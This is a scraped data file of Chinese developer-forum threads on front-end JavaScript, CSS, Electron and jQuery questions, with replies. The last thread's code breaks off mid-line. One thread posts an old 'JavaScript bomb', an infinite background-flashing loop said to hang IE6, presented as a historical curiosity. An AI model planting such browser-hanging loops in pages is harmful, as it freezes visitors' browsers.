{"content": ["<div class=\"topic_content\">前端不在行，这个问题 Google 了很久没有头绪，只好请教各位大神了。\r<br>简单说，就是移动版 web 页面，设置了 header 块级元素为 position:fixed ，这样拖动页面上下滚动就会一直浮在最顶部。\r<br>但是问题出在部分移动浏览器上，比如 iOS 7 上的 Safari ，当页面已经滚动到最顶部时，继续下拖，即往上滚动页面时，整个页面会被“拖拽”下来，包括浮动的 header ，上面出来一个灰色的背景。\r<br>而类似 iOS8 上貌似就不会。\r<br>有没有办法能规避这种情况呢？\r<br>手机没法传图，回头补一张图更直观。</div>", "<div class=\"topic_content\">多谢各位，晚上回去试试</div>"], "reply": "12", "tittle": "请教一个前端问题，困扰很久了", "comment": ["把网页的主体部分再放到一个 overflow ： Scroll 的层里，这样拖拽的就是这个层里面的内容而不是整个网页。", "慎用 fixed ，有输入框的时候，框都要被它挡住的", "在 head 里加入 <meta name=\"viewport\" content=\"width=device-width,target-densitydpi=high-dpi,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\"/>试试呢", "\r", "html, body{\r", "    height:100%;\r", "    position:relative;\r", "    -webkit-overflow-scrolling: touch;\r", "}\r", "header {\r", "    position:absolute;\r", "    top:0;\r", "    left:0\r", "}", "focus 时， fixed 改为 absolute\r", "原生键盘影响了定位\r", "\r", "我们的做法：不在有 input 的情况下设计 fixed 元素，列为规范\r", "\r", "小 tip ： position:-webkit-sticky;", "楼主 php 功力有待加强啊...", " php ？", " 哈哈哈哈什么鬼", "我觉得是 page bounce effect 的问题，你用这个关键词 google 看看，一般是 iOS 上才有的问题。\r", "\r", "- ", "\r", "- ", "\r", "- ", " Good ，这个方法的确规避了这个很恶心的情况，虽然还不是太完美（下拉的时候没有任何回弹效果了）。", " 是啊，我以前尝试解决这个问题也没找到什么很好的办法。"]},
{"content": ["<div class=\"topic_content\"><p>有个 Set ，样式如下：<br>\n<code><br>\nmySet{[1,1,1,2,1,0],[3,1,2,0,2,2],[0,2,2,3,2,3], ......}<br>\n</code><br>\n现在判断[1,1,1,2,1,0]在不在 mySet 里时</p>\n\n<ul>\n<li>参照<a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set#Using_the_Set_object\">Set</a>，使用</li>\n</ul>\n<div class=\"highlight\"><pre>console.log(mySet.has([1,1,1,2,1,0]));\n</pre></div>\n\n<p>输出 false</p>\n\n<ul>\n<li>参照 in</li>\n</ul>\n<div class=\"highlight\"><pre>console.log([1,1,1,2,1,0] in mySet);\n</pre></div>\n\n<p>输出 false</p>\n\n<p>ps ：使用 Set 主要是为了去重，其他的结构也在考虑，比如转 Set 为 Array 。因为不太懂 JavaScript ，搜索 stackoverflow 也没找到答案，求指点。</p>\n</div>"], "reply": "8", "tittle": "关于 JavaScript 判断 Set 集合中是否存在某元素的问题", "comment": ["值和引用的区别", " 想输出为 true ，可以实现么？", " 搜索到了，谢谢啦😁", "var a = [1,1,1,2,1,0]\r", "var b = [1,1,1,2,1,0]\r", "console.log(a === b) // false\r", "本质上是： a 、 b 指向不同的数组，只是这两个数组的内容相同而已", "我就是因为这种蛋疼的坑才不用 ES6 的 Set 的，下面是我自己实现的。\r", "\r", "这个是 equal ，判断两个 Set 是不是相等。\r", "\r", "\r", "用来判断的 equal 函数\r", " 是的，昨天看了文档， object ， array 之类的比较的是引用地址， Strings ， numbers 之类的比较的是值。:[", " 嗯，只好根据需求来实现。之前遇到 delay 的问题，也是没有 time.sleep 之类的方法😂", " \r", "\r", "关于 delay 这类异步的轮子我也有造过……\r", "\r", "没事，这种东西都可以造的……"]},
{"content": ["<div class=\"topic_content\">写的 webapp ，在电脑上调试好了，放在 android 4.1 的系统手机浏览器上一片空白，这种情况你们一般是怎么调试的？</div>"], "reply": "12", "tittle": "在低版本 webkit 手机浏览器上怎么调试好？", "comment": ["Chrome 控制台模拟手机？", " 什么意思？\r", "\r", "\r", "我想到个办法，下载一个旧 chrome 桌面版来试试，只要版本差不多的旧 webkit 核应该就行。\r", "下个 debian 6 ，在虚拟机里就可以装。", "桌面版 chrome 里按 F12 到开发者模式，然后左上角有个手机的 icon,点一下会把游览器的 user agent 设成手机来访问，也许就可以调试了\r", "这个办法可以设置手机的型号和屏幕尺寸，但不知能不能模拟旧的游览器内核，试试吧", " 你这个不行，我要的是旧的 webkit 核", " 4.1 的手机游览也要看手机游览器的版本的吧？和系统关系不大", "做兼容性真的蛋都碎了，一般不用那么麻烦的调试\r", "调用一些高级特性的时候查一下兼容性： ", "用 Android SDK 调试，或者 Fiddler 。", "搞定了，用桌面 chrome 调试就是方便。\r", "\r", "debian 6 带的 chrome 6 webkit 是 534 ， android 4.0.4 的是 531 ，基本差不多。", " 问题是你没有用最新科技，但不能保证你用的一堆第三方库都没有兼容性问题。", "其实 Windows 环境下的 Safari 就可以，各种问题几乎是一致性的重现", " 我记得那个没有调试工具？", " 有开发者工具的~~至于是不是满足你的需求我就不知道了 -。-"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们有一个 3d 打印机器，操作这个 3d 打印机器的程序是 python 写的，然后界面什么的是用 tkinter 写的，发现这个东西写的界面比较复杂，工作量也比较大，有没有可能用 electron + html 写程序的界面，然后调用 python 的程序，打包成一个软件，运行在 windows  和  mac 中？</p>\n\n<p>请高手指点！</p>\n</div></div>"], "reply": "5", "tittle": "用 electron 开发桌面应用，在本地如何和调用 python 程序，和 python 程序通信", "comment": ["Cura ？\r", "可以用 nodejs 中的 child_process 模块，具体可以使用 spawn 或 exec 或 execFile 。\r", "参考 ", " 。\r", "以下是一个使用 exec 的简单例子：\r", "require('child_process').exec('python xxx.py -a -b -c')", "这个能打包成一个单一的 exe 吗？最好是通过 require 的 node 的方式。不要 epel 。", "关注一下，最近刚好也有这样的需求，不过我的比较简单，用 1 楼的方法基本就可以，看看还有没有其他更好的解决方案", "直接用 cefpython 吧 同 electron 一个道理, 这样就可以用 py2exe/cxfree 打包为一个 exe 了", "我朋友的想法是 python 开 http 服务器……\r"]},
{"content": ["<div class=\"topic_content\">这是一个死循环，这是我见过的威(效)力(果)最大(绚)的一个 JavaScript 死循环。 IE6+已经修复这个漏洞，这使得下面这段代码只能成为经典，以此向曾经的 IE6 致敬。\r<br>&lt;HTML&gt;\r<br>&lt;BODY&gt;\r<br>&lt;SCRIPT&gt;\r<br>var color = new Array;\r<br>color[1] = \"black\";\r<br>color[2] = \"white\";\r<br>for(x = 0; x &lt;3; x++)\r<br>{\r<br>document.bgColor = color[x]\r<br>if(x == 2)\r<br>{\r<br>x = 0;\r<br>}\r<br>}\r<br>&lt;/SCRIPT&gt;\r<br>&lt;/BODY&gt;\r<br>&lt;/HTML&gt;</div>"], "reply": "1", "tittle": "一段 1999 年 5 月出炉的 JavaScript 炸弹，在 IE6 下威力无比，慎入！！！", "comment": ["ie6 会如何？死机还是灰色呢？"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://tutorialzine.com/2015/11/think-you-know-es6-prove-it/\" rel=\"nofollow\">http://tutorialzine.com/2015/11/think-you-know-es6-prove-it/</a>\r<br>17 题，全中没什么压力，感觉有点水。\r<br>没满分的，看我的 ES6 笔记哈～ <a target=\"_blank\" href=\"http://blog.e10t.net/understanding-ecmascript6-note/\" rel=\"nofollow\">http://blog.e10t.net/understanding-ecmascript6-note/</a></div>"], "reply": "14", "tittle": "验证你的 ES6 水平！", "comment": ["Good", "第一道会做脑袋发热点错了。。其他的都过了，不难。", "那个这是什么语言的题太逗了吧= =", "这个更像是科普新特性的", " 确实～", " 提起你学习的兴趣", "what's the es6 ?", "对 ES6 无感。无非还是背着蛋疼的历史包袱修修补补而已\r", "\r", "多的一些语法糖也并无什么太大卵用……", "一看就是广告", "从来没用过 ES6 的居然全猜对了…… 题干给的信息实在太多了……", " 所以我才说觉得水", "不晓得什么 ES6 ，“ You guessed 15 out of 17!”。新的 for loop 居然不是 for ... in ...", "太水了", "You guessed 12 out of 17!  什么鬼，完全猜的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>情景是这样的 在表单验证成功后，弹出 confirm 选择，确定之后再提交...</h2>\n\n<blockquote>\n<p>表单验证需要 submit 触发<br>\n表单提交验证完成时的回调函数(onValidationComplete)<br>\nfunction(form, valid){}，参数：<br>\nform ：表单元素<br>\nvalid ：验证结果（ ture or false ）<br>\nPS ：使用此方法后，表单即使验证通过也不会进行提交，交给定义的回调函数进行操作。</p>\n</blockquote>\n\n<p>submit 触发验证，验证通过后使用</p>\n<div class=\"highlight\"><pre>if(confirm(\"确定保存到系统？\")){\n        $('#form1').submit();\n}\n</pre></div>\n\n<h1>这样之后就无限弹窗了</h1>\n\n<h1>正确的办法应该是什么？</h1>\n<div class=\"highlight\"><pre><span class=\"cp\">&lt;!DOCTYPE HTML&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;head&gt;</span>\n<span class=\"nt\">&lt;meta</span> <span class=\"na\">charset=</span><span class=\"s\">\"utf-8\"</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;title&gt;</span>jQuery Validation Engine 表单验证中文版 <span class=\"ni\">&amp;raquo;</span> 在线演示 - 前端开发仓库<span class=\"nt\">&lt;/title&gt;</span>\n<span class=\"nt\">&lt;link</span> <span class=\"na\">rel=</span><span class=\"s\">\"stylesheet\"</span> <span class=\"na\">href=</span><span class=\"s\">\"http://code.ciaoca.com/css/demo.css\"</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;link</span> <span class=\"na\">rel=</span><span class=\"s\">\"stylesheet\"</span> <span class=\"na\">href=</span><span class=\"s\">\"http://code.ciaoca.com/jquery/validation_engine/demo/css/validationEngine.jquery.css\"</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;link</span> <span class=\"na\">rel=</span><span class=\"s\">\"stylesheet\"</span> <span class=\"na\">href=</span><span class=\"s\">\"http://code.ciaoca.com/jquery/validation_engine/demo/css/layout.css\"</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"wrap\"</span><span class=\"nt\">&gt;</span>\n\n  <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"main\"</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"inwrap\"</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;h1&gt;</span>jQuery Validation Engine 表单验证中文版<span class=\"nt\">&lt;/h1&gt;</span>\n      <span class=\"nt\">&lt;h2&gt;</span>验证回调函数（阻断提交）<span class=\"nt\">&lt;/h2&gt;</span>\n\n      <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"detail\"</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;p&gt;</span>使用参数<span class=\"nt\">&lt;code&gt;</span>onValidationComplete<span class=\"nt\">&lt;/code&gt;</span>设置在获得表单验证后，进行的操作。<span class=\"nt\">&lt;/p&gt;</span>\n        <span class=\"nt\">&lt;p&gt;</span>使用此方法后，表单即使验证通过也不会进行提交，交给定义的回调函数进行操作。<span class=\"nt\">&lt;/p&gt;</span>\n      <span class=\"nt\">&lt;/div&gt;</span>\n\n      <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"example\"</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;form</span> <span class=\"na\">id=</span><span class=\"s\">\"formID2\"</span> <span class=\"na\">class=</span><span class=\"s\">\"formular\"</span> <span class=\"na\">method=</span><span class=\"s\">\"post\"</span> <span class=\"na\">action=</span><span class=\"s\">\"\"</span><span class=\"nt\">&gt;</span>\n          <span class=\"nt\">&lt;fieldset&gt;</span>\n            <span class=\"nt\">&lt;legend&gt;</span>Phone<span class=\"nt\">&lt;/legend&gt;</span>\n            <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"tips\"</span><span class=\"nt\">&gt;</span>\n              <span class=\"nt\">&lt;p&gt;</span>手机号格式示例：<span class=\"nt\">&lt;/p&gt;</span>\n              <span class=\"nt\">&lt;ul&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>+103-304-340-4300-043<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>+1 305 768 23 34 ext 23<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>+1 (305) 768-2334 extension 703<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>+1 (305) 768-2334 x703<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>04312 / 777 777<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>01-47.34/32 56<span class=\"nt\">&lt;/li&gt;</span>\n                <span class=\"nt\">&lt;li&gt;</span>(01865)  123456<span class=\"nt\">&lt;/li&gt;</span>\n              <span class=\"nt\">&lt;/ul&gt;</span>\n            <span class=\"nt\">&lt;/div&gt;</span>\n            <span class=\"nt\">&lt;input</span> <span class=\"na\">value=</span><span class=\"s\">\"+1 305 768 23 34 ext 23 BUG\"</span> <span class=\"na\">class=</span><span class=\"s\">\"validate[required,custom[phone]] text-input\"</span> <span class=\"na\">type=</span><span class=\"s\">\"text\"</span> <span class=\"na\">name=</span><span class=\"s\">\"telephone\"</span> <span class=\"na\">id=</span><span class=\"s\">\"telephone\"</span><span class=\"nt\">&gt;</span>\n          <span class=\"nt\">&lt;/fieldset&gt;</span>\n\n          <span class=\"nt\">&lt;fieldset&gt;</span>\n            <span class=\"nt\">&lt;legend&gt;</span>OnlyLetter<span class=\"nt\">&lt;/legend&gt;</span>\n            <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"tips\"</span><span class=\"nt\">&gt;</span>只能输入 a-z 、 A-Z 、空格和单引号（'）<span class=\"nt\">&lt;/div&gt;</span>\n            <span class=\"nt\">&lt;input</span> <span class=\"na\">value=</span><span class=\"s\">\"this is an invalid char '.'\"</span> <span class=\"na\">class=</span><span class=\"s\">\"validate[required,custom[onlyLetterSp]] text-input\"</span> <span class=\"na\">type=</span><span class=\"s\">\"text\"</span> <span class=\"na\">name=</span><span class=\"s\">\"onlyascii\"</span> <span class=\"na\">id=</span><span class=\"s\">\"onlyascii\"</span><span class=\"nt\">&gt;</span>\n          <span class=\"nt\">&lt;/fieldset&gt;</span>\n\n          <span class=\"nt\">&lt;input</span> <span class=\"na\">class=</span><span class=\"s\">\"submit\"</span> <span class=\"na\">type=</span><span class=\"s\">\"submit\"</span> <span class=\"na\">value=</span><span class=\"s\">\"验证 &amp;amp; 提交表单\"</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;/form&gt;</span>\n      <span class=\"nt\">&lt;/div&gt;</span>\n\n    <span class=\"nt\">&lt;/div&gt;</span>\n  <span class=\"nt\">&lt;/div&gt;</span>\n<span class=\"nt\">&lt;/div&gt;</span>\n\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"http://code.ciaoca.com/js/jquery-1.7.2.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"http://code.ciaoca.com/jquery/validation_engine/demo/js/languages/jquery.validationEngine-zh-CN.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"http://code.ciaoca.com/jquery/validation_engine/demo/js/jquery.validationEngine.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n<span class=\"nx\">jQuery</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">ready</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"nx\">jQuery</span><span class=\"p\">(</span><span class=\"s1\">'#formID2'</span><span class=\"p\">).</span><span class=\"nx\">validationEngine</span><span class=\"p\">(</span><span class=\"s1\">'attach'</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n    <span class=\"nx\">onValidationComplete</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">form</span><span class=\"p\">,</span> <span class=\"nx\">status</span><span class=\"p\">){</span>\n      <span class=\"c1\">//alert('表单是否验证通过？结果：' + status + '，表单不会提交。');</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">status</span><span class=\"p\">){</span>\n           <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">confirm</span><span class=\"p\">(</span><span class=\"s2\">\"确定保存到系统？\"</span><span class=\"p\">)){</span>\n        <span class=\"nx\">form</span><span class=\"p\">.</span><span class=\"nx\">submit</span><span class=\"p\">();</span>\n           <span class=\"p\">}</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</pre></div>\n</div></div>"], "reply": "3", "tittle": "关于 jQuery Validation Engine 表单验证插件--onValidationComplete 参数的使用方法\r\n进入无限循环了，应该怎么解决？思路是什么...", "comment": ["$('#id').validationEngine('validate') //验证控件或表单，返回结果 true 或 false", " 感谢。已经用上了，还是上 GitHub Issues 看问题解决的快，中文文档好坑", "\r", "我是直接看了一下文档"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是拖动地图中心点不变 然后 输出中心点的经纬度这个样？用什么方法 感谢~</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "高德的 lbs 能不能做到像微信的地图一样的效果", "comment": []},
{"content": "", "reply": "8", "tittle": "请问 sublime text 有什么插件可以高亮 html 文件， script 标签中的 JS 代码", "comment": ["js 代码多的话就不写在 html 中，另写 js 文件。少的话高不高亮无所谓了", "没有。所以代码再少也是分开好。", "HTML/CSS/JS Prettify? \r", " \r", "Sublime Text 搞起前端来，像 Emmet （辅助生成 HTML ）  HTML/CSS/JS Prettify （格式＋美化 这三种代码） CSScomb （ CSS 排序）等等插件都是相当安装的。\r", "都是是相当有必要的插件。\r", "至于是是谁使得 HTML 中 JS 代码高亮，如今也不知道是谁起的作用了， 233 。\r", "\r", "自荐一篇 Sublime Text3 拙文： \r", "//i.v2ex.co/PtYw4kpu.png\r", "\r", "一直可以把.", "这样感觉已经够了吧 \r", " ", " 这是 Windows 下的字体吗", " 是的", " 这是什么字体？看起来挺不错的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果用 MySQL 的话， PHP 貌似是正选。但是后端想用 JavaScript 。不知道什么样的 framework 能和 MySQL 一起好用。 ExpressJS 吗？多谢！</p>\n</div></div>"], "reply": "10", "tittle": "问下 JavaScript 和 MySQL 一起用怎样？", "comment": ["你需要一个 ORM ，推荐 sequelize ， web 框架随意选", "为啥 php 正选了…", " 因为 PHP 是世界上最好的语言", "个人认为吧， JavaScript 和 Node.js 也是卡巴斯基和巴基斯坦的关系。前者是前端语言，后者才是服务端语言。", "跟 PHP 有啥关系，什么语言都能配合 MySQL", "有个框架叫 thinkjs ，貌似挺不错的，目前很火，你可以去官网看看，文档很全。 ", " 身为前端工程师，不敢苟同你的观点，就我知道的目前情况来看， node.js 一般也是前端工程师写的，而且一般用在 control 层。而且语言本来相同，还没见过别的门语言是单线程饱和运作的。", "nodejs 和 mongodb 更契合。说 php 搭 mysql 是“正选”，无非就是 APM 这种小型站的标配让你产生了错觉。", " 无意争论，只是觉得两者解释运行的环境并不一样的，服务的对象也不太一样，前端有前端的技术栈，服务端有服务端的，就算语法一样，写起来的思路也是很大区别。我只是觉得楼主这里的标题如果是 Node.js 和 MySQL 一起用怎样 会更好。", " \r", "感觉前端的模块化和组件化也是早晚的事，未来的开发模式可能越来越像 node 的开发模式，用 node 开发小型的功能模块应该会很快。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>单选按钮的样式，日期控件，下拉控件不会起作用<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://sfault-image.b0.upaiyun.com/166/243/1662433074-565fa01f8adf8_articlex\">http://sfault-image.b0.upaiyun.com/166/243/1662433074-565fa01f8adf8_articlex</a><br>\n因为内容区域是后来加载的 <a target=\"_blank\" rel=\"nofollow\" href=\"http://sfault-image.b0.upaiyun.com/100/214/100214199-565fa0ba6bb34_articlex\">http://sfault-image.b0.upaiyun.com/100/214/100214199-565fa0ba6bb34_articlex</a></p>\n\n<p>没有绑定到事件，正常绑定事件后应该是这样的</p>\n</div></div>", "<div class=\"topic_content\">已经解决</div>"], "reply": "8", "tittle": "bootstrap 无刷加载 html，组件不起作用", "comment": ["$('body').on ?", "麻烦写一下怎么解决的，万一有人搜到了这个帖子然后发现已经解决却没有解决方案超崩溃的！", " \r", "这样问 @", "和以前 csdn 的人一个德行，问要问的，解决了也不说怎么解决的，直接 block 了，最烦这种货色。", " 动态添加元素需要重新绑定或用 live 已废弃推荐 on 方法", "应该是加载 html 之后手动使用 BS 的 js 初始化方法，重新初始化控件\r", "PS block", "\r", "\r", "解决方法在这里, 楼主同时在很多地方问的问题，在别的地方得到了解决。", "动态生成的节点，要么在他们的父节点接受事件冒泡，要么在生成后重新绑定；楼主用了后者的方法"]},
{"content": ["<div class=\"topic_content\">es6 出来，一些特性越来越接近 python ，写的时候也越来越不想带分号了，大家现在情况怎样？</div>"], "reply": "69", "tittle": "现在，写 JS 带不带分号？", "comment": ["早期写过 coffeescript ，算是养成了简洁的习惯，现在靠 webstorm 的默认格式约束。", "想表达的是说，因为现在主要的编辑器是 webstorm ，如果缺少分号 webstorm 会提示的，所以我就靠 webstorm 的默认格式化。", "带吧，不过我是业余玩票的。看的书上是建议带。 ES6 还不熟。", "最近在着手做公司的编码规范， ES6 如果使用全带分号的写法的话，在 ES7 的 Decorator 上会遇上不小麻烦\r", "如果选全不带分号的话，在对象字面量里遇到 Computed Property Key 的时候会遇上些麻烦\r", "\r", "所以简单来说就是， ES 垃圾！", "多大的事这也问", " 为了养成好习惯，哈哈", "上面有点说错，不是对象字面量里遇到 Computed Property Key ，是在 Decorator 撞上一个 Computed Property Key 的时候\r", "\r", "大部分情况下是没关系的，只有下一条语句是以[或者(起始的时候，上面才必须分号结束，但这种语句太少太少", "按你的团队规范来！\r", "反正我是不带的。", " 那就很简单了，规范写成『在必要的时候加分号』", "分号不是必须的吧？", "必须加，这是共识", " 规范还是得写明白，事实上没多少人知道什么是“必要的时候”，不如拿这个当面试题坑人去\r", "\r", "\r", " 哪来的共识，随便给你找几个：\r", "\r", "airbnb ： ", "\r", "github （虽然是以 coffee 为主）： ", "\r", "\r", "虽然现在确实加分号是主流，但还没到“共识”这个程度，不加分号是可以运行得好好的", "项目内部统一就行， bootstrap 的 js 源码就是没分号的，不过个人还是习惯加分号。", "发错， airbnb 是以分号为主流的，找错\r", "\r", "顺便再给一个调查： ", " 知道，我的意思是，规范不一定是『处处用分号』或『处处不用』。", "我是不带的，代码看上去清爽多了。只要记住首字符是括号的情况下才需要前面加分号规则就行。", " 我不能来反驳你，但分号是必须的", " 我完全不明白不加分号会产生什么问题，是人会看不懂还是机器会看不懂……", " 《语言精粹》里提过", "自定了 ESLint 规则\r", "我们团队规定必须写", " 看自己喜好咯，大部分不加的情况不会遇到什么问题", "我觉得还是带吧 毕竟语言直接还是有差异的", "如果你确定不加分号，那么你要清楚你的代码是怎么跑的才行，不然容易出现想不到的问题。\r", "\r", "下面一个栗子, 如果 3 秒内没有发现为什么有问题。请乖乖把分号加回去:\r", "\r", "var aFunction = function () {\r", " alert(“我是一个方法哈哈哈”)\r", "}\r", "\r", "(function (\r", " //我叫一个闭包, 哈哈哈\r", ") {})", "过去，现在，将来，都写 =_=", "return\r", "false;", "建议还是能加就加。\r", "如果习惯 python ，那么建议尝试下 coffeescript ，分号大括号都不用啦。", " 你这个不能说明什么问题，因为既然加入不加分号党那一定会遵守首字符 ( [ 前加分号的规定。", "源代码肯定带啊，一切按照 jslint 走就好啦。\r", "\r", "反正后面还要代码合并压缩的", "\r", "记住几点规则就可以不带了。\r", "自打不带分号以后，不仅代码码起来更加流畅，看上去也更优雅了😀", "我只想静静的看你们把缩进换行都去掉", "To semicolon or not to semicolon; that is **NOT** a question\r", "\r", "加分号吧，可阅读性和维护性都更好，不要偷这懒", "我是能不加就不加。但是一旦加了，就要坚持都加。", "加加加加加 webstorm 就是这么烦", " 你们有耐心看懂我意思。  \"如果 3 秒内没有发现为什么有问题。请乖乖把分号加回去\"。", "一定要加，不加是埋雷作死行为。", "习惯了", "我记得玉伯在博客里也提倡不加，这样的人还是有一些影响力的", "还是要加，不然感觉不对， c#写习惯了。", "vue  \r", "bootstrap  \r", "npm  \r", "\r", "这些项目的 JS 代码都不加分号。", "可以不加", " \r", "\r", "然而\r", "angular\r", "ember\r", "jquery\r", "react\r", "\r", "这些项目的 JS 代码都加分号。", "JS 写的少。搜了一下，原来这个争论已经有些历史了\r", "\r", " 点赞 强迫症不能忍 加上后 warning 消失才舒服。。。", " 所以这是一个风格问题呀。有 Java, PHP 背景的倾向于加分号，有 Python, Ruby 背景的倾向于不加，按照团队的 Style guide 来就好。", "团队不要求加。。。\r", "但是还是觉得加分好比较好。", "我想问一下，主张不加分号的理由或者原因是什么？", "我基本都是加的，不加分号感觉没有结束一样，会感觉心里怪怪的；\r", "webStorm 里也会提示；\r", "加不加看个人习惯把，如果不加，压缩 JavaScript 代码时候，不给力的压缩网站，可能会出现未知错误（一般情况下，有些地方不加分号压缩好像也没啥事）；\r", "还有就是印象中好像在 JavaScript 高程三还是那本书里看到，说如果不加分号做结束，浏览器会自动判断并且给适当的位置添加分号进行解析；如果加了分号，就不需要浏览器去判断，可以直接解析代码，说是可以提高浏览器性能；\r", "感觉还是推荐加，不加分号总觉得怪怪的；", "带，除了 d3js", "说 WebStorm 提示的，都是不会配置么？", "加, 肯定得加入的, 即使我用 typescript 都加入的", "知道什么时候不加有问题，所以不加，只在必须加的是后加。\r", "\r", "比如楼上某处的\r", "\r", ";(function ...", "不带啊", "python 有强制缩进，每一行很明确； js 没这个特性，必须加。", " 莫明奇妙的推论， js 没有强制缩进不是有花括号吗，这和加不加分号有什么关系", "而且很多有影响力的项目不加分号说明这种做法是完全没有问题的，这只是个象缩进用 tab 还是空格一样的风格问题，比如牛 b 的 rackt 家的所有项目都不加分号。", " 缩进是没什么关系，比如很多 jquery 代码是这样的\r", "\r", "$.ajax()\r", ".done(function () {blablabla;})\r", ".fail(function () {blablabla;})\r", ".always(function () {blablabla;});\r", "\r", "\r", "我刚才稍微想了下觉得是 python 强制缩进所以不能这么用，但其实还是语言设计上的区别，不仅是缩进引起。", "不带分好编辑器会警告，所以我带", "我也不喜欢写分号，但是团队已有项目写分号，只有遵循了。", "一般都用 CoffeeScript ， IDE 对它的支持也好。", "能不用则不用。。。", "前端丢来的 js 都是不带分号的，因为一次 BUG 因为没有分号的原因以后每次都要求要带上分号...", "document.write(\"我觉得分号还是很有必要的，这个看团队要求吧\");", "坚持加分号 30 年", "弱弱问一下，不加分号会不会影响 js 压缩", "当年写 C++ 的时候觉得写 JS 也要加，现在写 Python 觉得 JS 能不加就不加。", "写！你做手工压缩的时候，你会发现没有分号会导致 JS 执行失败。当然大部分开源的压缩库都会处理的。", "对 我发现好几个老外出教程  都不写分号了 还以为是趋势了...", " \r", "还有人喜欢双引，有人喜欢引号，"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>手撸了一个猴子脚本，在回复中的 “屏蔽 感谢回复者” 工具栏的前面加上了一个用来屏蔽的快捷按钮，用来快捷屏蔽某一傻 X 。</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://greasyfork.org/zh-CN/scripts/14498\">&gt;&gt;猴子脚本安装传送门&lt;&lt;</a></p>\n\n<p>下面是实现代码：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">blockUserByReplyId</span> <span class=\"o\">=</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">reply_id</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">matched</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#r_'</span> <span class=\"o\">+</span> <span class=\"nx\">reply_id</span><span class=\"p\">).</span><span class=\"nx\">html</span><span class=\"p\">().</span><span class=\"nx\">match</span><span class=\"p\">(</span><span class=\"sr\">/\\/member\\/(\\w+)/</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">member_page_url</span> <span class=\"o\">=</span> <span class=\"nx\">matched</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">username</span> <span class=\"o\">=</span> <span class=\"nx\">matched</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">confirm</span><span class=\"p\">(</span><span class=\"s1\">'确定屏蔽傻 X '</span> <span class=\"o\">+</span> <span class=\"nx\">username</span> <span class=\"o\">+</span> <span class=\"s1\">' ?'</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span 